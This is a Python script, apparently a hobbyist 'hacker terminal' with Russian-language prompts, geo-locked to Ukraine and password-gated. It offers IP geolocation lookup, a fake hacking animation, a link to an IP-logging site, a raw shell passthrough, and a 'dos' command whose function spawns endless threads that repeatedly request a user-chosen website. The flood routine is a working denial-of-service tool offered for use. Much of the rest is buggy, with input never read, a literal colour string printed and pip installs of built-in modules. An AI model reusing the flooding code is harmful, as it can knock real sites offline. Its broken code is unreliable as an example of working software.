try:  
    from datetime import datetime
    from colorama import init
    import requests 
    import time 
    import random
    global get_ip 
    init()
    response = requests.get(f'http://ipinfo.io/json' )
    user_country = response.json()[ 'country' ] 
    if user_country == 'UA':
        print('Вы в Украине!, значит программу можно использовать')
        def pr1nt():
            print(input('Что вы хотите вывести в консоль?'))

        def time123():
            current_datetime = datetime.now()
            print(current_datetime)

        def ip():
            import requests 
            import time 
            import random 
            global get_ip 
            get_ip = input('[+] IP > > > ') 
            def load(): 
                m = 0 
                q = random.randint(1,6) 
                print("") 
                while m != q: 
                    time.sleep(0.5) 
                    print("loading...") 
                    m += 1 
            def info(): 
                load() 
                response = requests.get(f'http://ipinfo.io/{ get_ip }/json' ) 

                user_ip = response.json()[ 'ip' ] 
                user_city = response.json()[ 'city' ]  
                user_region = response.json()[ 'region' ] 
                user_country = response.json()[ 'country' ]  
                user_location = response.json()[ 'loc' ]  
                user_org = response.json()[ 'org' ]  
                user_timezone = response.json()[ 'timezone' ] 
                global all_info 
                all_info = f'Fore.RED + \n<Info>\nIP : { user_ip }\nСити : { user_city }\nРегион : { user_region }\nСтрана : { user_country }\nЛокация : { user_location }\nОгранизация : { user_org }\nЗона : { user_timezone }' 
                print( all_info ) 
            def record(): 
                user_record = '\n[?] Сохранить в текстовом документе? (д/н): ' 
                if user_record == 'д':  
                    g = random.randint(0,10000) 
                    file = open( 'ip_data'+str(g)+'.txt', 'a' ) #вся инфа в файле ip.txt 
                    file.write( f'{ all_info }\n' ) 
                    print(g + str(' --- Номер подписи файла'))
                    file.close() 
                elif user_record == 'н':  
                    print( '\n<O.K>' ) 
                else:
                    print('\r')
            def main():  
                info() 
                record() 
            main()
            print('Данная функция ещё не доработана')
        def numinfo():
            print('It`s command dont work...')
        def ddos_attack():
            import threading
            import requests
            site = input('[+] Site : ')
            zapross = input('Колличество входов(Не больше 100)')
            asdf = zapross.isdigit() 
            def ddos_attack_start():
                a = 0
                while a != zapross:
                    def dos():
                        while True:
                            requests.get(site)

                    while True:
                        threading.Thread(target=dos).start()
                    a += 1
                    print(a)
            if asdf == 'False':
                print('[+] Error > Это не число')
            elif int(zapross) > 100:
                print('[+] Error > Ваше устройство не поддерживает больше 100 входов!')
            elif int(zapross) < 0:
                print('[+] Число должно быть больше нуля!')
            else:
                ddos_attack_start()


        def colortxtx():
            from colorama import init, Fore
            from colorama import Back
            from colorama import Style
            init(autoreset=True)
        def hacksim():
            e = 0
            import random
            from colorama import init, Fore
            from colorama import Back
            from colorama import Style
            init(autoreset=True)
            asd = input('Сколько раз повторить цикл симуляции взлома\nВведите 0 чтобы это продолжалось бесконечно (Для того чтобы закончить цикл перезапустите консоль)\n[+] Input:  ')
            import time
            qdk = 0
            try:
                if int(asd) == 0:
                    qdk = 0
                    while 1:
                        z = random.randint(0,1)
                        x = random.randint(0,1)
                        c = random.randint(0,1)
                        v = random.randint(0,1)
                        a = str(z) + str(x) + str(c) + str(v)
                        d = str(a) * 2
                        print(Fore.GREEN + '' + str(d))
                        print(' ')
                        frazal = [Fore.RED + 'key list --Tachback error-- [Empty]', Fore.BLUE + 'Hacking-- n.s /d /a /c /r /t','Connect','Allram','dyrectory -- s -- Data/ad --= not found',Fore.CYAN + 'PassSharing -- s -- d -- f -- g -- b --','data/save/save.sav --  { Reset }', 'Key werificated', Fore.BLUE + 'Поиск уязвимостей', Fore.RED + '-- Tachback error --', Fore.RED + '-- Syntax Error --', Fore.RED + 'Expected [Exec variablity]',Fore.RED + 'Password is not defined']
                        g = random.randint(0,11)
                        fraza = frazal[int(g)]
                        print(Fore.GREEN + str(fraza))
                        print(' ')
                        time.sleep(0.01)
                        if qdk <= 10:
                            qdk = qdk + 1
                        else:
                            os.system('cls||clear')
                            qdk = 0


                else:
                    for e in range(int(asd)):
                        z = random.randint(0,1)
                        x = random.randint(0,1)
                        c = random.randint(0,1)
                        v = random.randint(0,1)
                        a = str(z) + str(x) + str(c) + str(v)
                        d = str(a) * 2
                        print(Fore.GREEN + '' + str(d))
                        print(' ')
                        frazal = [Fore.RED + 'key list --Tachback error-- [Empty]', Fore.BLUE + 'Hacking-- n.s /d /a /c /r /t','Connect','Allram','dyrectory -- s -- Data/ad --= not found',Fore.CYAN + 'PassSharing -- s -- d -- f -- g -- b --','data/save/save.sav --  { Reset }', 'Key werificated', Fore.BLUE + 'Поиск уязвимостей', Fore.RED + '-- Tachback error --', Fore.RED + '-- Syntax Error --', Fore.RED + 'Expected [Exec variablity]',Fore.RED + 'Password is not defined']
                        g = random.randint(0,11)
                        fraza = frazal[int(g)]
                        print(Fore.GREEN + str(fraza))
                        print(' ')
                        time.sleep(0.01)
                        if qdk <= 10:
                            qdk = qdk + 1
                        else:
                            os.system('cls||clear')
                            qdk = 0
            except:
                print(Fore.RED + 'Произошла непредвиденная ошибка, скорее всего вы ввели строковое значение вместо числового.')


        import os
        from colorama import init, Fore
        from colorama import Back
        from colorama import Style

        init(autoreset=True)

        print('installed 1/7')
        time.sleep(0.09)
        os.system('cls||clear')
        os.system('pip install colorama')
        print('installed 2/7')
        os.system('cls||clear')
        os.system('pip install json')
        print('installed 3/7')
        os.system('cls||clear')
        os.system('pip install requests')
        print('installed 4/7')
        os.system('cls||clear')
        os.system('pip install urllib.request')
        print('installed 5/7')
        os.system('cls||clear')
        os.system('pip install get_ip')
        print('installed 6/7')
        os.system('cls||clear')
        os.system('pip install os')
        print('installed 7/7')
        os.system('cls||clear')
        os.system('cls||clear')
        version = '4.0 [F2]'
        import time
        d = Fore.GREEN + '―'
        cl = Fore.WHITE
        def loading():
            init(autoreset=True)
            l = 2.8
            print('\r[' + d + cl +'――――――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d + cl +'―――――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d +d + d + cl +'――――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d + cl +'―――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  cl +'――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d +  d +  d +  d +  d +  d +  d + cl +'――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d + cl +'――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――]' + str(int(l)+2.8) + "%", end = '')
            l = l + 2.8
            time.sleep(0.2)
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'—――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'—―――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―—―]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―—]', end = '')
            time.sleep(0.2)
            l = l + 2.8
            print('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d  + d + cl +'—]', end = '')
            time.sleep(0.2)

            print('\r[' + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d, end = '')
            time.sleep(0.2)
            l = l + 2.8
            print(Fore.GREEN + '\r' + cl +'[' + Fore.GREEN + '―――――――――――――――――――――――――――――――――――' + cl + ']' + "100 %")

            time.sleep(0.2)
            print(Fore.BLUE + '\r[Loaded, connecting to Hacking libery]')
            time.sleep(2)
        loading()
        passchek = input('Введите пароль [PASS] >>> ')

        m = 1
        if passchek == '66572986':
            print(Fore.LIGHTCYAN_EX + 'Terminal Soft\nVersion: ' + version + '\nMeade by Limeek')
            while m:
                cmd = input(Fore.BLUE + 'Enter your command > > >')
                if cmd == 'ip' or cmd == 'getip' or cmd == 'iphack':
                    ip()
                elif cmd == 'print':
                    pr1nt()
                elif cmd == 'numinfo' or cmd == 'ninfo' or cmd == 'nuberhack' or cmd == 'phoneinfo':
                    numinfo()
                elif cmd == 'Ddos' or cmd == 'dos' or cmd == 'dosatack':
                    ddos_attack()
                elif cmd == 'exit' or cmd == 'end' or cmd == 'exit()':
                    m = 0
                elif cmd == 'cls' or cmd == 'clear':
                    import os
                    os.system('cls||clear')
                elif cmd == 'os':
                    try:
                        cmd1 = input(Fore.YELLOW + 'Введите команду > > >')
                        if cmd1 == 'python':
                            print('Нельзя вызвать пайтон в пайтоне!')
                        elif cmd1 == 'cmd':
                            print('Неизвестная ошибка')
                        else:
                            os.system(cmd1)
                    except:
                        print('Error [' + Fore.RED + '!' + Fore.WHITE + '] +' + Fore.RED + ' Вы ввели недопустимую команду!')
                elif cmd.startswith("open"):
                    if cmd.endswith("com") or cmd.endswith("ua") or cmd.endswith("ru") or cmd.endswith("org"):
                        import webbrowser
                        words = cmd.split(' ')
                        fragment = ''
                        new_words = []
                        for word in words:
                            if fragment not in word:
                                 new_words.append(word)
                        new_words
                        ' '.join(new_words)

                        webbrowser.open(word, new=1, autoraise=True)
                    if cmd.endswith(".py"):
                        import os
                        words = cmd.split(' ')
                        fragment = 'пере'
                        new_words = []
                        for word in words:
                             if fragment not in word:
                                 new_words.append(word)
                        new_words
                        ' '.join(new_words)
                        os.startfile(word)
                elif cmd == 'iplogger':
                        import os
                        import webbrowser
                        word = 'https://iplogger.org'
                        webbrowser.open(word, new=1, autoraise=True)
                elif cmd == 'help':

                    print('Данная программа постоянно будет обновлятся на github,\nтак как программа является хакерской она будет доступна только в регионах UA\nПароль сообщается только девереным лицам, а шифр убрать невозможно!')
                    help1 = input('Хотите получить список коданд [y/n]')
                    if help1 == 'y':
                        print('Наша консоль пока не доработана до конца но имеет команды:\nIp - Выводит информацию по введенному ip\nNumInfo - Выводит всю информацию по номеру телефона(!Не работает)\niplogger - открывает сайт iplogger.com\ndos - Эта функция позволит вам отправить от 1 до 100 входов на сайт с вашего ip(Скоро будет добавлен Vpn)\nopen - позволяет открыть сайт через главный браузер в системе\nos - функция по факту покажется бесполезной, однако с помощью неё вы можете открыть файл python или скачать модуль(pip)\nCls - если ваша консоль засорилась очистить её будет не проблема\nExit - завершить наш скрипт можно только так или закрыв полностью пайтон\nHackSimulation - функция позволит превратить себя в вооброжаемого хакера:)\nПока на этом всё, опять же на https://github.com/LimeekBro/CMDPRO вы всегда сможете обновить скрипт!\nДля того что-бы запустить скрипт на телефоне можно использовать pydroid или termux, что-бы узнать как запустить в termux или pydroid файл, пропишите android')
                elif cmd == 'hacksimulation':
                    hacksim()
                elif cmd == 'android':
                    andter = input('У вас имеется termux? [y/n]')
                    if andter == 'y':
                        print('Откройте термукс\nПишите следующие команды\npkg intall python\npkg install git\ngit clone https://github.com/LimeekBro/CMDPRO\ncd CMDPRO\npython main.py\nГотово! удачного хакинга')
                    else:
                        print('Так как у вас нету termux(Вы можете его скачать)\nДля того чтобы использовать pydroid\nВам понадобится вручную скачать файл main.py по ссылке https://github.com/LimeekBro/CMDPRO\nПотом запустить его через pydroid')
                else:
                    print('Error [' + Fore.RED + '!' + Fore.BLUE + '] ' + Fore.RED + ' Вы ввели недопустимую команду!' + Fore.BLUE + '[' + Fore.RED +str(cmd) + Fore.BLUE + ']')
        else:
            print('Error: Отказано в доступе')
    else:
        print('Программу можно использовать только в Украине! Если вы находитесь в Украине и программа не работает то попробуйте отключить VPN.\n Програма не должна использоватся в корыстных целях!')
except:
    
    print('Произошла непредвиденная ошибка\nНе вините себя скорее всего ошибка в исходном коде\nОбратитесь за помощью Telegram: @L1meek\nНапишите коментарий "L1meek i`m a have error"')
    